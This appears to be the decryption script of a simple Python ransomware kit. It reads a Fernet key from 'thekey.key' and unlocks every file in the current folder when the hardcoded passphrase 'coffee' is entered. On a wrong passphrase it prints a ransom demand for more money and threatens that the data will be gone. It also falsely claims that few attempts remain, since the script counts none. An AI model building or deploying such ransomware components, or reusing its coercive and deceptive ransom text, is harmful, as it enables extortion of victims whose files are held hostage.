import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomeware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secret_phrase = "coffee"

user_phrase = input("Enter the key to unlock the files which are decrypted: \n")

if user_phrase == secret_phrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Congrats, you have successfully decrypted your files!")
else:
    print("Sorry, wrong secret key entered! You have few attempts left. Send me more money to get the correct password, otherwise your data will be gone.")

